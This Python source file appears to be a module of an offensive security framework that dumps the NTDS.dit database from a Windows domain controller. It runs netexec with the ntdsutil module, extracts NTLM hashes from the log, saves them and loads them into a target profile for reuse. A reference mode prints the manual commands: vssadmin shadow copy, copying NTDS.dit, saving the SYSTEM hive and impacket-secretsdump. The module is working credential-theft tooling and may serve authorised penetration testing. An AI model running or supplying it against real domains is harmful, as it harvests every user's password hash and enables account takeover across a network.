from pathlib import Path
from datetime import datetime
import subprocess
import argparse

from core.target import get_current_ip
from core.target import target_add_cred
from core.paths import get_artifacts_dir


def run(data, cred, args):

    # =========================================================
    # COLORS
    # =========================================================

    G = '\033[92m'
    C = '\033[96m'
    B = '\033[94m'
    Y = '\033[93m'
    W = '\033[0m'
    R = '\033[91m'
    BOLD = '\033[1m'
    M = '\033[95m'

    # =========================================================
    # TARGET
    # =========================================================

    target = getattr(args, "target", None)

    if not target:
        target = get_current_ip(data)

    if not target:

        print(
            f"\n{R}[!] {W}{BOLD}NO TARGET{W}\n"
        )

        return

    # =========================================================
    # CURRENT CREDENTIAL
    # =========================================================

    

    username = cred.get("user")
    cred_type = "password"
    secret = cred.get("secret")

    # =========================================================
    # REFERENCE MODE
    # =========================================================

    if getattr(args, "reference", False):

        print(
            f"\n{B}┌── {BOLD}MODULE: NTDS DUMP{W}{B} ─────────────────────┐{W}"
        )

        print(
            f"{B}└────────────────────────────────────────────────────┘{W}"
        )

        print(
            f"\n{B}[*]{W} Automated\n"
        )

        print(
            f"{Y}netexec smb "
            f"{M}<dc>{Y} "
            f"-u {M}<user>{Y} "
            f"-p {M}<password>{Y} "
            f"-M ntdsutil{W}"
        )

        print(
            f"\n{B}[*]{W} Manual Method\n"
        )

        print(
            f"{Y}vssadmin CREATE SHADOW /For=C:{W}"
        )

        print(
            f"{Y}copy "
            f"\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy"
            f"{M}<n>{Y}"
            f"\\Windows\\NTDS\\NTDS.dit "
            f"C:\\NTDS.dit{W}"
        )

        print(
            f"{Y}reg save HKLM\\SYSTEM SYSTEM{W}"
        )

        print(
            f"{Y}impacket-secretsdump "
            f"-ntds NTDS.dit "
            f"-system SYSTEM "
            f"LOCAL{W}\n"
        )

        return

    # =========================================================
    # ARTIFACTS
    # =========================================================

    artifact_dir = (
        get_artifacts_dir(
            data["name"]
        )
        / "ntds"
    )

    artifact_dir.mkdir(
        parents=True,
        exist_ok=True
    )

    stamp = datetime.now().strftime(
        "%Y%m%d_%H%M%S"
    )

    logfile = (
        artifact_dir /
        f"ntds_dump_{stamp}.log"
    )

    hash_file = (
        artifact_dir /
        "ntlm_hashes.txt"
    )

    # =========================================================
    # HUD
    # =========================================================

    print(
        f"\n{B}┌── {BOLD}MODULE: NTDS DUMP{W}{B} ─────────────────────────┐{W}"
    )

    print(
        f"{B}│{W}  {B}Target:{W} "
        f"{C}{str(target):<38}{W}"
        f"{B}│{W}"
    )

    print(
        f"{B}│{W}  {B}User:{W}   "
        f"{C}{username:<38}{W}"
        f"{B}│{W}"
    )

    print(
        f"{B}│{W}  {B}Auth:{W}   "
        f"{C}{cred_type.capitalize():<38}{W}"
        f"{B}│{W}"
    )

    print(
        f"{B}└──────────────────────────────────────────────────────┘{W}"
    )

    # =========================================================
    # COMMAND
    # =========================================================

    cmd = [
        "netexec",
        "smb",
        str(target),
        "-u",
        username
    ]

    if cred_type == "password":

        cmd.extend(
            [
                "-p",
                secret
            ]
        )

    elif cred_type == "ntlm":

        cmd.extend(
            [
                "-H",
                secret
            ]
        )

    else:

        print(
            f"\n{R}[!] {W}Unsupported credential type{W}\n"
        )

        return

    cmd.extend(
        [
            "-M",
            "ntdsutil",
            "--log",
            str(logfile)
        ]
    )

    print(
        f"\n{B}[*]{W} Running\n"
    )

    print(
        f"{Y}{' '.join(cmd)}{W}\n"
    )

    # =========================================================
    # EXECUTE
    # =========================================================

    subprocess.run(cmd)

    # =========================================================
    # PARSE LOG
    # =========================================================

    if not logfile.exists():

        print(
            f"\n{R}[!] {W}LOGFILE NOT FOUND{W}"
        )

        print(
            f"{B}  └── {C}{logfile}{W}\n"
        )

        return

    try:

        lines = logfile.read_text(
            errors="ignore"
        ).splitlines()

    except Exception:

        print(
            f"\n{R}[!] {W}FAILED TO READ LOGFILE{W}\n"
        )

        return

    EMPTY_NTLM = (
        "31d6cfe0d16ae931b73c59d7e0c089c0"
    )

    recovered = []

    for line in lines:

        if ":::" not in line:
            continue

        if "NTDSUTIL" not in line:
            continue

        try:

            entry = line.split()[-1]

            parts = entry.split(":")

            if len(parts) < 4:
                continue

            username = parts[0]

            if "\\" in username:
                username = username.split(
                    "\\",
                    1
                )[1]

            nthash = parts[3]

            if nthash.lower() == EMPTY_NTLM:
                continue

            if username.lower() == "guest":
                continue

            recovered.append(
                {
                    "user": username,
                    "hash": nthash
                }
            )

        except Exception:
            pass

    # =========================================================
    # RESULTS
    # =========================================================

    if not recovered:

        print(
            f"\n{Y}[-] {W}No hashes recovered{W}\n"
        )

        return

    hash_file.write_text(
        "\n".join(
            x["hash"]
            for x in recovered
        )
    )

    print(
        f"\n{G}[+] {W}Recovered "
        f"{C}{len(recovered)}{W} NTLM hash(es)\n"
    )

    for entry in recovered:

        print(
            f"  {B}├──{W} "
            f"{C}{entry['user']}{W} "
            f"{Y}{entry['hash']}{W}"
        )

    print()

    print(
        f"{G}[+] {W}Hashes Saved"
    )

    print(
        f"{B}  └── {C}{hash_file}{W}\n"
    )

    # =========================================================
    # SAVE TO PROFILE
    # =========================================================

    added = 0

    for i, entry in enumerate(recovered):

        try:

            target_add_cred(
                argparse.Namespace(
                    user=entry["user"],
                    password=None,
                    hash=entry["hash"],
                    aes=None,
                    ccache=None
                ),
                show=(
                    i == len(recovered) - 1
                ),
                switch=(
                    i == len(recovered) - 1
                )
            )

            added += 1

        except Exception:
            pass

    print(
        f"{G}[+] {W}Added "
        f"{C}{added}{W} hash(es) "
        f"to target profile\n"
    )

    # =========================================================
    # RETURN
    # =========================================================

    return [
        {
            "type": "credential",
            "data": {
                "service": "ntds",
                "username": x["user"],
                "hash": x["hash"]
            }
        }
        for x in recovered
    ]
